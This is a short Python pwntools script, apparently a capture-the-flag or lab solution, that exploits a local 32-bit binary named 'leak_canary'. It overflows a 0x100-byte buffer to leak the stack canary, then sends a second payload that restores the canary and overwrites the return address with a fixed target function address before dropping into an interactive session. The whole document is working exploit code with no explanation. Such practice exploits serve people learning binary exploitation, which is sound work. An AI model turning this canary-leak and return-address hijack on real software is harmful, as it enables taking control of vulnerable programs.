from pwn import *

p = process("./leak_canary")
gdb.attach(p,"b *0x08048645")

target = 0x080485CC

p1 = "a" * 0x100 + "b"
p.send(p1)
p.recvuntil("a" * 0x100)
leak_info = u32(p.recv(4))
canary = leak_info - ord("b")
log.success("canary:" + hex(canary))

p2 = "\x00" * 0x100 + p32(canary)
p2 += p32(0) * 3
p2 += p32(target)
p.send(p2)
p.interactive()
